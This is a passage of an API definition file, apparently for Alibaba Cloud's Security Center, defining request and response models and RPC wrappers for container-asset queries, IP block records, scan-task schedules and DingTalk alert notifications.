*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection', example='webshell_timescan'),
  }(name='TargetConfig', description='The information about the configuration item.'),
}

model DescribeCommonTargetResultListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetResultListResponseBody(name='body'),
}

async function describeCommonTargetResultList(request: DescribeCommonTargetResultListRequest): DescribeCommonTargetResultListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCommonTargetResultList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeConcernNecessityRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeConcernNecessityResponseBody = {
  concernNecessity?: [ string ](name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeConcernNecessityResponseBody(name='body'),
}

async function describeConcernNecessity(request: DescribeConcernNecessityRequest): DescribeConcernNecessityResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeConcernNecessity', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerAppsRequest {
  clusterId?: string(name='ClusterId', example='ca0a686115432429ca26cf780f5e9fff5', position='Query'),
  currentPage: int32(name='CurrentPage', example='1', position='Query'),
  fieldValue?: string(name='FieldValue', example='cas-adad-qeqwe', position='Query'),
  pageSize: int32(name='PageSize', example='200', position='Query'),
}

model DescribeContainerAppsResponseBody = {
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  tagValues?: [ string ](name='TagValues'),
}

model DescribeContainerAppsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerAppsResponseBody(name='body'),
}

async function describeContainerApps(request: DescribeContainerAppsRequest): DescribeContainerAppsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerApps', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerCriteriaRequest {
  groupField?: string(name='GroupField', description='The filter condition. Valid values:

*   **pod**: pod
*   **appName**: application name
*   **clusterId**: cluster ID
*   **namespace**: namespace
*   **image**: image
*   **containerScan**: container scan', example='clusterId', position='Query'),
  value?: string(name='Value', description='The value of the filter condition. The value can be an application name, node name, namespace, cluster name, public IP address, pod address, region, pod, instance ID, cluster ID, or container ID. Fuzzy match is supported.', example='cfb41a869c71e4678a97021582dd8a****', position='Query'),
}

model DescribeContainerCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **instanceId**: the ID of the container instance.
*   **clusterId**: the cluster ID.
*   **regionId**: the ID of the region in which the container resides.
*   **clusterName**: the name of the cluster.
*   **image**: the name of the image.
*   **imageRepoName**: the name of the image repository.
*   **imageRepoNamespace**: the namespace of the image repository.
*   **imageRepoTag**: the tag of the image repository.
*   **imageDigest**: the image digest.
*   **ClusterType**: the type of the cluster.
*   **hostIp**: the public IP address.
*   **pod**: the pod.
*   **podIp**: the IP address of the pod.
*   **containerId**: the container ID.
*   **vulStatus**: indicates whether vulnerabilities exist in the container.
*   **alarmStatus**: indicates whether alerts are generated for the container.
*   **riskStatus**: indicates whether risks exist in the container.
*   **riskLevel**: the risk level of the container.
*   **containerScope**: the type of the container.', example='clusterId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is set to **select**.

> If the value of **Type** is set to **input**, the return value of this parameter is empty.', example='ManagedKubernetes,NotManagedKubernetes,PrivateKubernetes'),
    }
  ](name='CriteriaList', description='An array that consists of information about the filter condition.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeContainerCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerCriteriaResponseBody(name='body'),
}

async function describeContainerCriteria(request: DescribeContainerCriteriaRequest): DescribeContainerCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to filter containers. The value of this parameter is in the JSON format and is case-sensitive. The value contains the following fields:

*   **name**: the search condition.

*   **name**: the value of the search condition.

*   **logicalExp**: the logical relationship among multiple search conditions. Valid values:

    *   **OR**: Search conditions are evaluated by using a logical **OR**.
    *   **AND**: Search conditions are evaluated by using a logical **AND**.

> You can use search conditions such as the container ID, cluster ID, cluster name, cluster type, risk level, and region. You can call the [DescribeContainerCriteria](~~DescribeContainerCriteria~~) operation to query the supported search conditions.', example='[{"name":"flag","value":"0|8","logicalExp":"AND"},{"name":"ecsType","value":"!8","logicalExp":"AND"}][{"name":"clusterType","value":"NotManagedKubernetes","logicalExp":"AND"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical operator that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='AND', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model DescribeContainerInstancesResponseBody = {
  containerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts.', example='1'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
      appName?: string(name='AppName', description='The name of the application.', example='alibaba-log-controller'),
      clusterId?: string(name='ClusterId', description='The ID of cluster.', example='cfb41a869c71e4678a97021582dd8a****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d****'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1670368337000'),
      exposed?: int32(name='Exposed', description='The container is exposed.', example='1'),
      exposedDetail?: string(name='ExposedDetail', description='The container exposed details .', example='[{}]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='1'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected. Valid values:

*   **NO**
*   **YES**', example='YES'),
      hostIp?: string(name='HostIp', description='The IP address of the server.', example='172.24.XX.XX'),
      image?: string(name='Image', description='The image of the container.', example='docker.io/library/nginx:latest'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/log-controller@sha256:5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='log-controller'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace to which the image repository belongs.', example='acs'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image.', example='0.3.1.0-dfa2010-aliyun'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='5f23dfbceec289a49ac94e035e2****'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2zegzjyotydfkz9****'),
      namespace?: string(name='Namespace', description='The namespace.', example='kube-system'),
      nodeInfo?: string(name='NodeInfo', description='The node information.', example='test'),
      nodeName?: string(name='NodeName', description='The name of the node.', example='test'),
      pod?: string(name='Pod', description='The pod.', example='alibaba-log-controller-6f847f8786-mk2mg'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.24.XX.XX'),
      regionId?: string(name='RegionId', description='The region ID of the container.', example='cn-hangzhou'),
      riskCount?: string(name='RiskCount', description='The number of risks.', example='1'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**
*   **YES**', example='YES'),
      updateMark?: string(name='UpdateMark', description='The update identifier of the container.', example='79cff74d-e967-5407-8a78-ee03b9****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected in the container cluster.', example='15'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected in the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='ContainerInstanceList', description='An array that consists of the information about containers.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerInstancesResponseBody(name='body'),
}

async function describeContainerInstances(request: DescribeContainerInstancesRequest): DescribeContainerInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerScanConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeContainerScanConfigResponseBody = {
  data?: {
    allCount?: int32(name='AllCount', description='The total number of container applications in the cluster.', example='100'),
    appNames?: string(name='AppNames', description='The names of the container applications.', example='[\\"alicloud-monitor-controller\\"]'),
    chooseCount?: int32(name='ChooseCount', description='The number of selected container applications.', example='10'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='hhht-cluster-02'),
  }(name='Data', description='The response parameters.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='69BFFCDE-37D6-5A49-A8BC-BB03AC83****'),
}

model DescribeContainerScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerScanConfigResponseBody(name='body'),
}

async function describeContainerScanConfig(request: DescribeContainerScanConfigRequest): DescribeContainerScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerStatisticsRequest {
  clusterId: string(name='ClusterId', description='The ID of the specified container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to obtain the cluster ID.', example='Cccfd68c474454665ace07efce924****', position='Query'),
}

model DescribeContainerStatisticsResponseBody = {
  data?: {
    remindAlarmCount?: int32(name='RemindAlarmCount', description='The number of alerts whose risk level is **Reminder**.', example='1'),
    seriousAlarmCount?: int32(name='SeriousAlarmCount', description='The number of alerts whose risk level is **Urgent**.', example='2'),
    suspiciousAlarmCount?: int32(name='SuspiciousAlarmCount', description='The number of alerts whose risk level is **Suspicious**.', example='3'),
    totalAlarmCount?: int32(name='TotalAlarmCount', description='The total number of alerts that are generated in the current container cluster.', example='6'),
    totalNode?: int32(name='TotalNode', description='The total number of nodes in the current container cluster.', example='12'),
    hasRiskNode?: int32(name='hasRiskNode', description='The number of nodes on which alerts are generated in the current container cluster.', example='4'),
  }(name='Data', description='The alert statistics of container assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='21DA46CA-2DCE-4FF6-907D-D5DBBB7518C8'),
}

model DescribeContainerStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerStatisticsResponseBody(name='body'),
}

/**
  * Only users who created a Container Registry Enterprise Edition instance can call this operation.
  *
 */
async function describeContainerStatistics(request: DescribeContainerStatisticsRequest): DescribeContainerStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeContainerTagsRequest {
  appName?: string(name='AppName', description='The name of the application.', example='node-exporter', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  fieldName: string(name='FieldName', description='The name of the attribute that is used for the query. Valid values:

*   **namespace**: the namespace
*   **appName**: the application name
*   **image**: the image
*   **tag**: the tag', example='namespace', position='Query'),
  fieldValue?: string(name='FieldValue', description='The value of the attribute that is used for the query.', example='demo4', position='Query'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-name-01', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page. Default value: 200.', example='200', position='Query'),
}

model DescribeContainerTagsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  tagValues?: [ string ](name='TagValues', description='An array that consists of the attributes of container assets.'),
}

model DescribeContainerTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerTagsResponseBody(name='body'),
}

async function describeContainerTags(request: DescribeContainerTagsRequest): DescribeContainerTagsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeContainerTags', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCountNotScannedImageRequest {
}

model DescribeCountNotScannedImageResponseBody = {
  notScannedCnt?: int32(name='NotScannedCnt', description='The number of images that are not scanned.', example='28'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeCountNotScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountNotScannedImageResponseBody(name='body'),
}

async function describeCountNotScannedImage(request: DescribeCountNotScannedImageRequest): DescribeCountNotScannedImageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCountNotScannedImage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCountScannedImageRequest {
}

model DescribeCountScannedImageResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
  scannedCount?: int32(name='ScannedCount', description='The number of images that are scanned.', example='11'),
}

model DescribeCountScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountScannedImageResponseBody(name='body'),
}

async function describeCountScannedImage(request: DescribeCountScannedImageRequest): DescribeCountScannedImageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCountScannedImage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCriteriaRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset. Valid values:

*   Set the value to **ecs**, which specifies to query all Elastic Compute Service (ECS) instances.', example='ecs', position='Query'),
  supportAutoTag?: boolean(name='SupportAutoTag', description='Specifies whether the keyword that you specify for fuzzy search can be automatically matched. Default value: **false**. Valid values:

*   **true**
*   **false**', example='true', position='Query'),
  value?: string(name='Value', description='The keyword that you specify for fuzzy search when you query the asset.', example='47.96', position='Query'),
}

model DescribeCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', description='The structured attribute values of the assets that match the keyword. The value of this parameter is in the JSON format and contains the following fields:

*   **vendor**: providers.
*   **regionIds**: IDs of supported regions', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **internetIp**: the public IP address.
*   **intranetIp**: the private IP address.
*   **instanceName**: the name of the instance.
*   **instanceId**: the instance ID.
*   **vpcInstanceId**: the ID of the virtual private cloud (VPC) to which the instance belongs.
*   **osName**: the operating system.
*   **osType**: the operating system type.
*   **hcStatus**: indicates whether baseline risks exist.
*   **vulStatus**: indicates whether vulnerabilities exist.
*   **alarmStatus**: indicates whether security alerts exist.
*   **riskStatus**: indicates whether risks exist.
*   **clientStatus**: indicates the status of the client.
*   **runningStatus**: the running status of the asset.
*   **tagName**: the name of the tag.
*   **groupName**: the name of the server group.
*   **regionId**: the region ID.
*   **importance**: the importance of the asset.
*   **exposedStatus**: indicates whether the server is exposed.
*   **authVersion**: the authorization version.
*   **flag**: the cloud service provider.
*   **ipList**: the IP addresses.
*   **uuidList** :the UUID.
*   **tagKeyValue**: the ECS tag.', example='internetIp'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The attribute values of the assets that match the keyword.', example='47.96.XX.XX'),
    }
  ](name='CriteriaList', description='The information about the search conditions of assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8E6DDACF-99AF-5939-AFFD-FCCD3B01E724'),
}

model DescribeCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCriteriaResponseBody(name='body'),
}

async function describeCriteria(request: DescribeCriteriaRequest): DescribeCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCustomBlockInstancesRequest {
  blockIp?: string(name='BlockIp', example='47.92.33.1xx', position='Query'),
  bound?: string(name='Bound', example='in', position='Query'),
  currentPage?: int32(name='CurrentPage', example='8', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  status?: int32(name='Status', example='1', position='Query'),
}

model DescribeCustomBlockInstancesResponseBody = {
  instanceList?: [ 
    {
      aliNetOnline?: boolean(name='AliNetOnline', example='true'),
      blockType?: string(name='BlockType', example='group'),
      errorCode?: string(name='ErrorCode', example='AliNetNotOnline'),
      instanceName?: string(name='InstanceName', example='myInstance'),
      internetIp?: string(name='InternetIp', example='116.62.121.1xx'),
      intranetIp?: string(name='IntranetIp', example='192.168.1.xx'),
      status?: int32(name='Status', example='1'),
      successInfo?: string(name='SuccessInfo', example='{"aliUid":*******,"groupId":"sg-xxxx","groupName":"Sas_Malicious_Ip_Security_Group","groupType":"normal","instanceId":"i-xxxx","regionId":"cn-shenzhen","vpcId":"vpc-xxxxxxxx"}'),
      uuid?: string(name='Uuid', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='83'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
}

model DescribeCustomBlockInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCustomBlockInstancesResponseBody(name='body'),
}

async function describeCustomBlockInstances(request: DescribeCustomBlockInstancesRequest): DescribeCustomBlockInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCustomBlockInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCustomBlockRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to block by using the defense rule.', example='117.66.XX.XX', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1', position='Query'),
}

model DescribeCustomBlockRecordsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='708'),
  }(name='PageInfo', description='The pagination information.'),
  recordList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp generated when the block action on the IP address becomes invalid.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The blocked IP address.', example='45.227.XX.XX'),
      bound?: string(name='Bound', description='The direction of the traffic that is sent by the blocked IP address. Valid values:

*   **in**
*   **out**', example='in'),
      enableCount?: int32(name='EnableCount', description='The number of servers for which the defense rule is enabled.', example='4'),
      id?: long(name='Id', description='The record ID.', example='353376'),
      serverCount?: int32(name='ServerCount', description='The total number of servers on which the IP address is blocked.', example='6'),
      source?: string(name='Source', description='The source of the defense rule.', example='UserRule'),
      status?: int32(name='Status', description='The status of the defense rule against brute-force attacks. Valid values:

*   **0**: invalid.
*   **1**: enabled.
*   **2**: failed.', example='1'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The ID of the destination asset.', example='032b618f-b220-4a0d-bd37-fbdc6*******'),
          targetType?: string(name='TargetType', description='The type of the query. Valid values:

*   Set the value to **uuid**.', example='uuid'),
        }
      ](name='TargetList', description='The servers for which the defense rule is enabled.'),
    }
  ](name='RecordList', description='An array that consists of the defense rules.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6B7T8Y'),
}

model DescribeCustomBlockRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCustomBlockRecordsResponseBody(name='body'),
}

async function describeCustomBlockRecords(request: DescribeCustomBlockRecordsRequest): DescribeCustomBlockRecordsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCustomBlockRecords', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCycleTaskListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS\\_VUL\\_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG\\_VUL\\_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN', position='Query'),
  taskType: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS\\_VUL\\_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG\\_VUL\\_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN', position='Query'),
}

model DescribeCycleTaskListResponseBody = {
  cycleScheduleResponseList?: [ 
    {
      configId?: string(name='ConfigId', description='The configuration ID.', example='2cdbdeba8dd70586d5814d4cbf21****'),
      enable?: int32(name='Enable', description='Indicates whether the configuration for the task interval was enabled. Valid values:

*   **1**: enabled.
*   **0**: disabled.', example='1'),
      firstDateStr?: long(name='FirstDateStr', description='The time when the task first started.', example='1667491200000'),
      intervalPeriod?: int32(name='IntervalPeriod', description='The interval between which two consecutive tasks are run.', example='3'),
      lastTaskId?: string(name='LastTaskId', description='The ID of the last task.', example='38730bb078f4a1461d4ed283994c****'),
      nextStartTimeStr?: long(name='NextStartTimeStr', description='The time when the next task starts. The value is a UNIX timestamp. Unit: milliseconds.', example='1671184531000'),
      param?: string(name='Param', description='The extended information.', example='{"userAgreement":"yes","lang":"zh"}'),
      periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**', example='day'),
      targetEndTime?: int32(name='TargetEndTime', description='The end time of the task. The time must be a time frame.', example='7'),
      targetStartTime?: int32(name='TargetStartTime', description='The start time of the task. The start time must be a time frame.', example='0'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the task.', example='IMAGE_SCAN'),
    }
  ](name='CycleScheduleResponseList', description='An array that consists of periodic scan tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeCycleTaskListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCycleTaskListResponseBody(name='body'),
}

async function describeCycleTaskList(request: DescribeCycleTaskListRequest): DescribeCycleTaskListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCycleTaskList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeDefaultProxyInstallVersionRequest {
}

model DescribeDefaultProxyInstallVersionResponseBody = {
  installVersion?: string(name='InstallVersion', example='proxy_01_03'),
  requestId?: string(name='RequestId', example='F9FCB51A-5078-5D31-9C4D-3B25BEF068C7'),
}

model DescribeDefaultProxyInstallVersionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDefaultProxyInstallVersionResponseBody(name='body'),
}

async function describeDefaultProxyInstallVersion(request: DescribeDefaultProxyInstallVersionRequest): DescribeDefaultProxyInstallVersionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeDefaultProxyInstallVersion', 'POST', '/', 'json', false, 'json', request);
}

model DescribeDingTalkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.Default value: 1.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.Default value: 20.', example='20', position='Query'),
  ruleActionName?: string(name='RuleActionName', description='The name of the notification.', example='Vulnerability notification', position='Query'),
}

model DescribeDingTalkResponseBody = {
  actionList?: [ 
    {
      actionName?: string(name='ActionName', description='The name of the notification.', example='Alert notification'),
      aliUid?: long(name='AliUid', description='The UID of the user.', example='12312412341'),
      configList?: string(name='ConfigList', description='The list of notification settings.', example='[{\\"type\\":\\"vul\\",\\"configItemList\\":[{\\"key\\":\\"key\\", \\"valueList\\":\\"123\\"}]}]'),
      dingTalkLang?: string(name='DingTalkLang', description='The language of the content within notifications. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
      gmtCreate?: long(name='GmtCreate', description='The creation time. unit:millisecond.', example='1550828400000'),
      gmtModified?: long(name='GmtModified', description='The modification time.', example='1550828400000'),
      groupIdList?: string(name='GroupIdList', description='The group IDs.', example='"123,456"'),
      id?: int32(name='Id', description='The ID of the notification.', example='1'),
      intervalTime?: int32(name='IntervalTime', description='The interval at which the notifications are sent.unit:minute.', example='1000'),
      status?: int32(name='Status', description='The status of the notification. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
      url?: string(name='Url', description='The parameters of the notification.', example='https://oapi.dingtalk.com/robot/send'),
    }
  ](name='ActionList', description='An array that consists of details of notifications.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of messages.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model DescribeDingTalkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDingTalkResponseBody(name='body'),
}

async function describeDingTalk(request: DescribeDingTalkRequest): DescribeDingTalkResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeDingTalk', 'POST', '/', 'json', false, 'json', request);
}

model DescribeDomainCountRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX', position='Query'),
}

model DescribeDomainCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
  rootDomainsCount?: int32(name='RootDomainsCount', description='The number of root domains.', example='5'),
  subDomainsCount?: int32(name='SubDomainsCount', description='The number of subdomains.', example='5'),
  totalDomainsCount?: int32(name='TotalDomainsCount', description='The total number of entries returned.', example='10'),
}

model DescribeDomainCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
